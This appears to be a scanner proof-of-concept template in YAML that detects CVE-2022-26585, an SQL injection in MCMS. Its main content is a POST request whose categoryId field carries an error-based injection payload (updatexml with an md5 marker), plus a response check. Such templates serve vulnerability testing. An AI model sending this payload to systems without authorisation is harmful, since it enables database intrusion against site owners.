name: poc-yaml-mcms-cve-2022-26585-sqli
binding: 989a8391-c02d-4f21-97c0-56ef946c281a
manual: true
detail:
    author: 东晓南
    links:
        - https://toscode.gitee.com/mingSoft/MCMS/issues/I4W1S9
        - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202204-1954
    vulnerability:
        id: CT-406258
        level: critical
transport: http
set:
    r1: randomInt(100000, 200000)
    s1: randomInt(100000, 200000)
    s2: randomLowercase(5)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /cms/content/list
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: categoryId={{r1}}' AND updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1) AND '{{s2}}'='{{s2}}
            follow_redirects: true
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0()
